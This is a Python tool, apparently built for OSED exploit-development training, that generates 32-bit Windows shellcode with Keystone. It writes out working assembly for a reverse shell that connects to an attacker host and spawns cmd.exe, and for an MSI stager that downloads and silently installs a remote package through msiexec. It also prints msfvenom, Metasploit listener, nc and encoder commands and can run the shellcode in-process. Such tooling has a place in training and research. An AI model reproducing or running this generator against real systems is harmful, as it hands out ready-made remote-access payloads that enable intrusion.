#!/usr/bin/python3
import sys
import argparse
import ctypes
import struct
import platform

try:
    import keystone as ks
except ImportError:
    raise SystemExit("[!] Keystone not installed. Run: pip install keystone-engine")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def to_hex(s):
    return s.encode().hex()


def to_sin_ip(ip_address):
    ip_addr_hex = [format(int(b), "02x") for b in ip_address.split(".")]
    ip_addr_hex.reverse()
    return "0x" + "".join(ip_addr_hex)


def to_sin_port(port):
    port_hex = format(int(port), "04x")
    return "0x" + port_hex[2:4] + port_hex[0:2]


def ror_str(byte, count):
    """ROR without numpy."""
    return ((byte >> count) | (byte << (32 - count))) & 0xFFFFFFFF


def push_function_hash(function_name):
    edx = 0x00
    for i, ch in enumerate(function_name):
        edx += ord(ch)
        if i < len(function_name) - 1:
            edx = ror_str(edx, 0xd)
    return "push " + hex(edx)


def push_string(input_string, null_terminate=True):
    """
    Generate x86 NASM to push input_string onto the stack.

    - Always zeroes EAX before partial-chunk moves (no hidden caller dependency).
    - null_terminate=True (default): prepends xor eax,eax / push eax so callers
      don't need to push a null separately.
    - Fixes the 3-byte remainder case with shl to avoid embedded null bytes.
    - EAX is clobbered; EBX/ECX/EDX are untouched.
    """
    hex_payload = input_string.encode().hex()
    hex_len = len(hex_payload)

    instructions = []
    first_instructions = []

    for i in range(hex_len, 0, -1):
        if (i % 8) == 0:
            chunk = hex_payload[i - 8:i]
            dword = chunk[6:8] + chunk[4:6] + chunk[2:4] + chunk[0:2]
            instructions.append(f"push dword 0x{dword};")
        elif i == 1 and (hex_len % 8) != 0:
            remainder = hex_len % 8
            tail = hex_payload[hex_len - remainder:]
            first_instructions.append("xor eax, eax;")  # explicit zero — no caller side-effect
            if remainder == 2:   # 1 byte
                first_instructions.append(f"mov al, 0x{tail[0:2]};")
                first_instructions.append("push eax;")
            elif remainder == 4: # 2 bytes
                first_instructions.append(f"mov ax, 0x{tail[2:4] + tail[0:2]};")
                first_instructions.append("push eax;")
            else:                # 3 bytes — use shl to avoid embedded null
                first_instructions.append(f"mov al, 0x{tail[4:6]};")  # byte2
                first_instructions.append("shl eax, 0x08;")
                first_instructions.append(f"mov al, 0x{tail[2:4]};")  # byte1
                first_instructions.append("shl eax, 0x08;")
                first_instructions.append(f"mov al, 0x{tail[0:2]};")  # byte0
                first_instructions.append("push eax;")

    null_instr = ["xor eax, eax;", "push eax;"] if null_terminate else []
    return "".join(null_instr + first_instructions + instructions)


# ---------------------------------------------------------------------------
# Shared assembly block (was copy-pasted three times before)
# ---------------------------------------------------------------------------

def find_function_stub():
    """Kernel32 walker + export-table function resolver, shared by all payloads."""
    return [
        "   find_kernel32:                       ",
        "       xor ecx, ecx                    ;",  # ECX = 0
        "       mov esi, fs:[ecx+30h]           ;",  # ESI = &(PEB)
        "       mov esi, [esi+0Ch]              ;",  # ESI = PEB->Ldr
        "       mov esi, [esi+1Ch]              ;",  # ESI = PEB->Ldr.InInitOrder
        "   next_module:                         ",
        "       mov ebx, [esi+8h]              ;",   # EBX = base_address
        "       mov edi, [esi+20h]             ;",   # EDI = module_name
        "       mov esi, [esi]                 ;",   # ESI = flink (next)
        "       cmp [edi+12*2], cx             ;",   # modulename[12] == 0?
        "       jne next_module                ;",   # No: try next module
        "   find_function_shorten:              ",
        "       jmp find_function_shorten_bnc  ;",   # Short jump
        "   find_function_ret:                  ",
        "       pop esi                        ;",   # POP return address
        "       mov [ebp+0x04], esi            ;",   # Save find_function address
        "       jmp resolve_symbols_kernel32   ;",
        "   find_function_shorten_bnc:          ",
        "       call find_function_ret         ;",   # Relative CALL, negative offset
        "   find_function:                      ",
        "       pushad                         ;",
        "       mov eax, [ebx+0x3c]            ;",  # Offset to PE Signature
        "       mov edi, [ebx+eax+0x78]        ;",  # Export Table Directory RVA
        "       add edi, ebx                   ;",  # Export Table Directory VMA
        "       mov ecx, [edi+0x18]            ;",  # NumberOfNames
        "       mov eax, [edi+0x20]            ;",  # AddressOfNames RVA
        "       add eax, ebx                   ;",  # AddressOfNames VMA
        "       mov [ebp-4], eax               ;",  # Save AddressOfNames VMA
        "   find_function_loop:                 ",
        "       jecxz find_function_finished   ;",  # ECX == 0? done
        "       dec ecx                        ;",
        "       mov eax, [ebp-4]               ;",  # Restore AddressOfNames VMA
        "       mov esi, [eax+ecx*4]           ;",  # RVA of symbol name
        "       add esi, ebx                   ;",  # VMA of symbol name
        "   compute_hash:                       ",
        "       xor eax, eax                   ;",
        "       cdq                            ;",
        "       cld                            ;",
        "   compute_hash_again:                 ",
        "       lodsb                          ;",
        "       test al, al                    ;",
        "       jz compute_hash_finished       ;",
        "       ror edx, 0x0d                  ;",
        "       add edx, eax                   ;",
        "       jmp compute_hash_again         ;",
        "   compute_hash_finished:              ",
        "   find_function_compare:              ",
        "       cmp edx, [esp+0x24]            ;",  # Computed hash == requested?
        "       jnz find_function_loop         ;",
        "       mov edx, [edi+0x24]            ;",  # AddressOfNameOrdinals RVA
        "       add edx, ebx                   ;",  # AddressOfNameOrdinals VMA
        "       mov cx, [edx+2*ecx]            ;",  # Ordinal
        "       mov edx, [edi+0x1c]            ;",  # AddressOfFunctions RVA
        "       add edx, ebx                   ;",  # AddressOfFunctions VMA
        "       mov eax, [edx+4*ecx]           ;",  # Function RVA
        "       add eax, ebx                   ;",  # Function VMA
        "       mov [esp+0x1c], eax            ;",  # Overwrite pushad's eax slot
        "   find_function_finished:             ",
        "       popad                          ;",
        "       ret                            ;",
    ]


# ---------------------------------------------------------------------------
# Argument validation (was entirely missing before)
# ---------------------------------------------------------------------------

def validate_args(args):
    import ipaddress

    try:
        ipaddress.ip_address(args.lhost)
    except ValueError:
        raise SystemExit(f"[!] Invalid IP address: {args.lhost!r}")

    try:
        port = int(args.lport)
        if not (1 <= port <= 65535):
            raise ValueError()
    except ValueError:
        raise SystemExit(f"[!] Invalid port: {args.lport!r} (must be 1–65535)")

    if args.msi and args.messagebox:
        raise SystemExit("[!] --msi and --messagebox are mutually exclusive")

    if args.messagebox and (args.mb_header is None or args.mb_text is None):
        raise SystemExit("[!] --messagebox requires both --mb-header and --mb-text")

    if args.test_shellcode:
        if platform.system() != "Windows":
            raise SystemExit("[!] --test-shellcode is only supported on Windows")
        if (struct.calcsize("P") * 8) != 32:
            raise SystemExit("[!] --test-shellcode requires a 32-bit Python interpreter")


# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
    push_instr_terminate_hash    = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
    push_instr_createprocessa    = push_function_hash("CreateProcessA")
    push_instr_wsastartup        = push_function_hash("WSAStartup")
    push_instr_wsasocketa        = push_function_hash("WSASocketA")
    push_instr_wsaconnect        = push_function_hash("WSAConnect")

    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;",
        "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
    ] + find_function_stub() + [
        "   resolve_symbols_kernel32:            ",
        push_instr_terminate_hash,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x10], eax             ;",  # Save TerminateProcess
        push_instr_loadlibrarya_hash,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA
        push_instr_createprocessa,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x18], eax             ;",  # Save CreateProcessA
        "   load_ws2_32:                         ",
        "       xor eax, eax                    ;",
        "       mov ax, 0x6c6c                  ;",
        "       push eax                        ;",  # "ll\0\0"
        "       push 0x642e3233                 ;",  # "32.d"
        "       push 0x5f327377                 ;",  # "ws2_"
        "       push esp                        ;",
        "       call dword ptr [ebp+0x14]       ;",  # LoadLibraryA("ws2_32.dll")
        "   resolve_symbols_ws2_32:              ",
        "       mov ebx, eax                    ;",  # ws2_32 base
        push_instr_wsastartup,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x1C], eax             ;",  # Save WSAStartup
        push_instr_wsasocketa,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x20], eax             ;",  # Save WSASocketA
        push_instr_wsaconnect,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x24], eax             ;",  # Save WSAConnect
        "   call_wsastartup:                    ;",
        "       mov eax, esp                    ;",
        "       xor ecx, ecx                    ;",
        "       mov cx, 0x590                   ;",
        "       sub eax, ecx                    ;",
        "       push eax                        ;",  # lpWSAData (below current frame)
        "       xor eax, eax                    ;",
        "       mov ax, 0x0202                  ;",
        "       push eax                        ;",  # wVersionRequired
        "       call dword ptr [ebp+0x1C]       ;",
        "   call_wsasocketa:                     ",
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # dwFlags
        "       push eax                        ;",  # g
        "       push eax                        ;",  # lpProtocolInfo
        "       mov al, 0x06                    ;",  # IPPROTO_TCP
        "       push eax                        ;",
        "       sub al, 0x05                    ;",  # 0x01
        "       push eax                        ;",  # type = SOCK_STREAM
        "       inc eax                         ;",  # 0x02
        "       push eax                        ;",  # af = AF_INET
        "       call dword ptr [ebp+0x20]       ;",
        "   call_wsaconnect:                     ",
        "       mov esi, eax                    ;",  # SOCKET descriptor
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # sin_zero[]
        "       push eax                        ;",  # sin_zero[]
        f"      push {to_sin_ip(rev_ip_addr)}   ;",  # sin_addr
        f"      mov ax, {to_sin_port(rev_port)} ;",  # sin_port
        "       shl eax, 0x10                   ;",
        "       add ax, 0x02                    ;",  # AF_INET
        "       push eax                        ;",
        "       push esp                        ;",
        "       pop edi                         ;",  # EDI = &sockaddr_in
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # lpGQOS
        "       push eax                        ;",  # lpSQOS
        "       push eax                        ;",  # lpCalleeData
        "       push eax                        ;",  # lpCallerData
        "       add al, 0x10                    ;",  # namelen = 16
        "       push eax                        ;",
        "       push edi                        ;",  # *name
        "       push esi                        ;",  # s
        "       call dword ptr [ebp+0x24]       ;",
        "   create_startupinfoa:                 ",
        "       push esi                        ;",  # hStdError
        "       push esi                        ;",  # hStdOutput
        "       push esi                        ;",  # hStdInput
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # lpReserved2
        "       push eax                        ;",  # cbReserved2 & wShowWindow
        "       mov al, 0x80                    ;",
        "       xor ecx, ecx                    ;",
        "       mov cl, 0x80                    ;",
        "       add eax, ecx                    ;",  # dwFlags = 0x100 (STARTF_USESTDHANDLES)
        "       push eax                        ;",
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # dwFillAttribute
        "       push eax                        ;",  # dwYCountChars
        "       push eax                        ;",  # dwXCountChars
        "       push eax                        ;",  # dwYSize
        "       push eax                        ;",  # dwXSize
        "       push eax                        ;",  # dwY
        "       push eax                        ;",  # dwX
        "       push eax                        ;",  # lpTitle
        "       push eax                        ;",  # lpDesktop
        "       push eax                        ;",  # lpReserved
        "       mov al, 0x44                    ;",  # cb = sizeof(STARTUPINFOA)
        "       push eax                        ;",
        "       push esp                        ;",
        "       pop edi                         ;",  # EDI = &STARTUPINFOA
        "   create_cmd_string:                   ",
        "       mov eax, 0xff9a879b             ;",
        "       neg eax                         ;",  # EAX = 0x00657865 ("exe\0")
        "       push eax                        ;",
        "       push 0x2e646d63                 ;",  # "cmd."
        "       push esp                        ;",
        "       pop ebx                         ;",  # EBX = ptr to "cmd.exe"
        "   call_createprocessa:                 ",
        "       mov eax, esp                    ;",
        "       xor ecx, ecx                    ;",
        "       mov cx, 0x390                   ;",
        "       sub eax, ecx                    ;",
        "       push eax                        ;",  # lpProcessInformation
        "       push edi                        ;",  # lpStartupInfo
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # lpCurrentDirectory
        "       push eax                        ;",  # lpEnvironment
        "       push eax                        ;",  # dwCreationFlags
        "       inc eax                         ;",  # TRUE
        "       push eax                        ;",  # bInheritHandles
        "       dec eax                         ;",
        "       push eax                        ;",  # lpThreadAttributes
        "       push eax                        ;",  # lpProcessAttributes
        "       push ebx                        ;",  # lpCommandLine
        "       push eax                        ;",  # lpApplicationName
        "       call dword ptr [ebp+0x18]       ;",
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",  # uExitCode
        "       push 0xffffffff                 ;",  # hProcess = -1 (current)
        "       call dword ptr [ebp+0x10]       ;",
    ]
    return "\n".join(asm)


def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
    port_part = "" if rev_port == "80" else f":{rev_port}"
    msi_exec_str = f"msiexec /i http://{rev_ip_addr}{port_part}/X /qn"
    # Pad to 4-byte boundary so all pushes are full DWORDs
    pad = (4 - len(msi_exec_str) % 4) % 4
    msi_exec_str += " " * pad

    push_instr_terminate_hash    = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
    push_instr_system_hash       = push_function_hash("system")
    push_instr_msvcrt            = push_string("msvcrt.dll")   # null included
    push_instr_msi               = push_string(msi_exec_str)   # null included

    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;",
        "       add esp, 0xfffff9f0             ;",
    ] + find_function_stub() + [
        "   resolve_symbols_kernel32:            ",
        push_instr_terminate_hash,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x10], eax             ;",  # Save TerminateProcess
        push_instr_loadlibrarya_hash,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA
        "   load_msvcrt:                         ",
        push_instr_msvcrt,                           # push_string handles null terminator
        "       push esp                        ;",
        "       call dword ptr [ebp+0x14]       ;",  # LoadLibraryA("msvcrt.dll")
        "   resolve_symbols_msvcrt:              ",
        "       mov ebx, eax                    ;",  # msvcrt base
        push_instr_system_hash,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x18], eax             ;",  # Save system()
        "   call_system:                         ",
        push_instr_msi,                              # push_string handles null terminator
        "       push esp                        ;",
        "       call dword ptr [ebp+0x18]       ;",  # system("msiexec ...")
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",
        "       push 0xffffffff                 ;",
        "       call dword ptr [ebp+0x10]       ;",
    ]
    return "\n".join(asm)


def msg_box(header, text, breakpoint=0):
    push_instr_terminate_hash    = push_function_hash("TerminateProcess")
    push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
    push_instr_msgbox_hash       = push_function_hash("MessageBoxA")
    push_instr_user32            = push_string("user32.dll")  # null included
    push_instr_header            = push_string(header)        # null included
    push_instr_text              = push_string(text)          # null included

    asm = [
        "   start:                               ",
        f"{['', 'int3;'][breakpoint]}            ",
        "       mov ebp, esp                    ;",
        "       add esp, 0xfffff9f0             ;",
    ] + find_function_stub() + [
        "   resolve_symbols_kernel32:            ",
        push_instr_terminate_hash,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x10], eax             ;",  # Save TerminateProcess
        push_instr_loadlibrarya_hash,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA
        "   load_user32:                         ",
        push_instr_user32,                           # push_string handles null terminator
        "       push esp                        ;",
        "       call dword ptr [ebp+0x14]       ;",  # LoadLibraryA("user32.dll")
        "   resolve_symbols_user32:              ",
        "       mov ebx, eax                    ;",  # user32 base
        push_instr_msgbox_hash,
        "       call dword ptr [ebp+0x04]       ;",
        "       mov [ebp+0x18], eax             ;",  # Save MessageBoxA
        "   call_messageboxa:                    ",
        push_instr_header,                           # null-terminated header on stack
        "       mov ebx, esp                    ;",  # EBX = lpCaption
        push_instr_text,                             # null-terminated text below header
        "       mov ecx, esp                    ;",  # ECX = lpText
        "       xor eax, eax                    ;",
        "       push eax                        ;",  # uType = 0
        "       push ebx                        ;",  # lpCaption
        "       push ecx                        ;",  # lpText
        "       push eax                        ;",  # hWnd = NULL
        "       call dword ptr [ebp+0x18]       ;",  # MessageBoxA
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",
        "       push 0xffffffff                 ;",
        "       call dword ptr [ebp+0x10]       ;",
    ]
    return "\n".join(asm)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main(args):
    validate_args(args)

    if args.msi:
        shellcode = msi_shellcode(args.lhost, args.lport, args.debug_break)
        help_msg = (
            f"\t Create MSI payload:\n"
            f"\t\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n"
            f"\t Start HTTP server (hosting the MSI file):\n"
            f"\t\t sudo python -m SimpleHTTPServer {args.lport}\n"
            f"\t Start Metasploit listener:\n"
            f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; '
            f"set PAYLOAD windows/meterpreter/reverse_tcp; "
            f'set LHOST {args.lhost}; set LPORT 443; exploit"'
        )
        mode = "MSI stager"
    elif args.messagebox:
        shellcode = msg_box(args.mb_header, args.mb_text, args.debug_break)
        help_msg = "\t MessageBox payload — no listener required."
        mode = "MessageBox"
    else:
        shellcode = rev_shellcode(args.lhost, args.lport, args.debug_break)
        help_msg = f"\t Start listener:\n\t\t nc -lnvp {args.lport}"
        mode = "reverse shell"

    print(shellcode)

    try:
        eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
        encoding, count = eng.asm(shellcode)
    except ks.KsError as e:
        raise SystemExit(f"[!] Keystone assembly error: {e}")

    # Bad-char check against raw byte values — not the formatted hex string.
    # The old check did substring matching on "\\xNN" which produced false positives
    # (e.g. "00" matching inside "\xb0\x0d").
    sentry = False
    for bad in args.bad_chars:
        try:
            bad_byte = int(bad, 16)
        except ValueError:
            raise SystemExit(f"[!] Bad char must be hex (e.g. 00 0a), got: {bad!r}")
        if bad_byte in encoding:
            print(f"[!] Found bad char 0x{bad}")
            sentry = True

    final = 'shellcode = b"' + "".join(f"\\x{enc:02x}" for enc in encoding) + '"'

    if sentry:
        print(f"[=] {final}", file=sys.stderr)
        raise SystemExit("[!] Remove bad characters and try again")

    print(f"[+] Shellcode created!")
    print(f"[=]   len:   {len(encoding)} bytes")
    print(f"[=]   lhost: {args.lhost}")
    print(f"[=]   lport: {args.lport}")
    print(f"[=]   break: {['disabled', 'active'][args.debug_break]}")
    print(f"[=]   mode:  {mode}")

    if args.store_shellcode:
        with open("shellcode.bin", "wb") as f:
            f.write(bytearray(encoding))
        print("[=]   Shellcode stored in: shellcode.bin")

    print("[=]   help:")
    print(help_msg)
    print()
    print("\t Remove bad chars with msfvenom (use --store-shellcode flag):")
    print('\t\t cat shellcode.bin | msfvenom --platform windows -a x86 '
          '-e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d" '
          '-f python -v shellcode')
    print()
    print(final)

    if args.test_shellcode:
        print("\n[+] Debugging shellcode ...")
        packed_shellcode = bytearray(encoding)
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0),
            ctypes.c_int(len(packed_shellcode)),
            ctypes.c_int(0x3000),
            ctypes.c_int(0x40),
        )
        buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
        )
        print(f"[=]   Shellcode at: {hex(ptr)}")
        input("...ENTER TO EXECUTE SHELLCODE...")
        ht = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr),
            ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)),
        )
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Creates shellcodes compatible with the OSED lab VM"
    )
    parser.add_argument("-l", "--lhost",
        help="attacker listen address (default: 127.0.0.1)", default="127.0.0.1")
    parser.add_argument("-p", "--lport",
        help="attacker listen port (default: 4444)", default="4444")
    parser.add_argument("-b", "--bad-chars",
        help="space-separated hex bad chars (default: 00)", default=["00"], nargs="+")
    parser.add_argument("-m", "--msi",
        help="MSI exploit stager mode", action="store_true")
    parser.add_argument("--messagebox",
        help="MessageBox PoC payload", action="store_true")
    parser.add_argument("--mb-header", help="MessageBox caption text")
    parser.add_argument("--mb-text",   help="MessageBox body text")
    parser.add_argument("-d", "--debug-break",
        help="insert int3 as first instruction", action="store_true")
    parser.add_argument("-t", "--test-shellcode",
        help="execute shellcode in-process (Windows 32-bit only)", action="store_true")
    parser.add_argument("-s", "--store-shellcode",
        help="write raw bytes to shellcode.bin", action="store_true")

    args = parser.parse_args()
    main(args)
